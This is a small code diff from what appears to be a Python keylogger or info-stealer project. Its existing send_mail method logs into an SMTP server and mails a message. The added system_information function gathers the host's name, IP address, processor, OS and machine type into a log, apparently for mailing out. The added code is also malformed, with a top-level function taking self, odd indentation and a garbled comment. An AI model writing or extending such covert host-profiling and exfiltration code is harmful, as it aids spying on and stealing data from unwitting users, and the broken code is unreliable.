@@ -13,3 +13,17 @@ def send_mail(self, email, password, message):
             with smtplib.SMTP("smtp.mailtrap.io", 2525) as server:
                 server.login(email, password)
                 server.sendmail(sender, receiver, message)
+
+# Same all -------------s
+
+def system_information(self):
+            hostname = socket.gethostname()
+            ip = socket.gethostbyname(hostname)
+            plat = platform.processor()
+            system = platform.system()
+            machine = platform.machine()
+            self.appendlog(hostname)
+            self.appendlog(ip)
+            self.appendlog(plat)
+            self.appendlog(system)
+            self.appendlog(machine)
